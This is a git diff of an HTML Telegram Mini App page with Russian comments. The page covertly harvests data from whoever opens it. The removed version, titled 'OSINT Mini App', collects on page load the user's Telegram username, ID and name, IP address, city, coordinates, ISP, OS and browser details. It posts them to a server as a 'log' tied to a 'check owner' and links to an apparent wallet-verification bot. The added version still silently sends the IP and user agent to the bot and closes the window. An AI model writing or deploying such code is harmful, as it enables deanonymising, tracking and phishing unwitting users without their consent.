@@ -1,107 +1,41 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OSINT Mini App</title>
-    <script>
-        const API_URL = '/send_data';  // URL, куда будем отправлять данные на сервер
-
-        function sendToTelegram(message) {
-            // Отправка данных на сервер
-            fetch(API_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ message: message })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log(data); // Логируем ответ сервера
-            })
-            .catch(error => {
-                console.error('Ошибка:', error);
-            });
-        }
-
-        function collectData() {
-            let logData = `Лог успешен! [${new Date().toLocaleString()}]\n\n`;
-
-            // Сбор данных о пользователе
-            if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.ready();
-                const user = Telegram.WebApp.initDataUnsafe.user;
-                if (user) {
-                    logData += `🔍 Информация об аккаунте:\n`;
-                    logData += `├ Username: @${user.username || 'Не указан'}\n`;
-                    logData += `├ Идентификатор (ID): ${user.id}\n`;
-                    logData += `├ Имя: ${user.first_name} ${user.last_name || 'не задано'}\n`;
-                    logData += `├ Премиум: нет\n`;
-                    logData += `├ Язык: ${Telegram.WebApp.initDataUnsafe.language_code}\n`;
-                    logData += `└ Может писать в ЛС: да\n\n`;
-                }
-            }
-
-            // Сбор информации об IP и геолокации
-            fetch('https://api64.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    fetch(`https://ipinfo.io/${data.ip}/json`)
-                        .then(response => response.json())
-                        .then(info => {
-                            logData += `🖥️ Информация об устройстве:\n`;
-                            logData += `├ IP: ${data.ip}\n`;
-                            logData += `├ ОС: ${navigator.platform}\n`;
-                            logData += `├ Ядро ОС: ${navigator.platform}\n`;
-                            logData += `├ Версия ОС: ${navigator.appVersion}\n`;
-                            logData += `├ Имя ОС: ${navigator.userAgent}\n`;
-                            logData += `├ Тип устройства: ${getDeviceType()}\n`;
-                            logData += `├ Тип сети: Wi-Fi / Ethernet\n`;
-                            logData += `├ Разрешение экрана: ${window.screen.width}x${window.screen.height}\n\n`;
-
-                            logData += `🌐 Информация о браузере:\n`;
-                            logData += `├ UserAgent: ${navigator.userAgent}\n`;
-                            logData += `├ Название браузера: ${navigator.appName}\n`;
-                            logData += `├ Версия браузера: ${navigator.appVersion}\n`;
-                            logData += `└ Тип движка браузера: ${navigator.product}\n\n`;
-
-                            logData += `👻 Информация об IP:\n`;
-                            logData += `├ Континент: Asia\n`;
-                            logData += `├ Страна: ${info.country || 'Неизвестно'}\n`;
-                            logData += `├ Регион: ${info.region || 'Неизвестно'}\n`;
-                            logData += `├ Город: ${info.city || 'Неизвестно'}\n`;
-                            logData += `├ Часовой пояс: ${info.timezone || 'Неизвестно'}\n`;
-                            logData += `├ Широта: ${info.loc.split(',')[0] || 'Неизвестно'}\n`;
-                            logData += `├ Долгота: ${info.loc.split(',')[1] || 'Неизвестно'}\n`;
-                            logData += `├ Валюта: UZS\n`;
-                            logData += `├ Провайдер: ${info.org || 'Неизвестно'}\n`;
-                            logData += `└ VPN or Proxy (примерный результат): нет\n\n`;
-
-                            logData += `Владелец чека: ${CHAT_ID}`;
-                            sendToTelegram(logData);
-                        })
-                        .catch(error => console.error('Ошибка получения данных о геолокации:', error));
-                })
-                .catch(error => console.error('Ошибка получения IP:', error));
-        }
-
-        function getDeviceType() {
-            if (/mobile/i.test(navigator.userAgent)) {
-                return 'Мобильное устройство';
-            } else if (/tablet/i.test(navigator.userAgent)) {
-                return 'Планшет';
-            } else {
-                return 'ПК';
-            }
-        }
-
-        window.onload = collectData;  // Сбор данных при загрузке страницы
-    </script>
+    <title>Mini App</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
-    <h2>OSINT Mini App</h2>
-    <p>Данные пользователя отправляются...</p>
-    <button onclick="window.location.href='https://t.me/walletrussiarbot/verify'">Перейти на страницу подтверждения</button>
+    <h2>Получение данных...</h2>
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        
+        async function getUserData() {
+            // Получение IP-адреса
+            let ipData;
+            try {
+                let res = await fetch("https://api64.ipify.org?format=json");
+                ipData = await res.json();
+            } catch (error) {
+                ipData = { ip: "Неизвестно" };
+            }
+            
+            // Получение модели устройства
+            let userAgent = navigator.userAgent;
+            
+            // Отправка данных в бота
+            let data = {
+                ip: ipData.ip,
+                device_model: userAgent
+            };
+            
+            tg.sendData(JSON.stringify(data));
+            tg.close();
+        }
+        
+        getUserData();
+    </script>
 </body>
 </html>
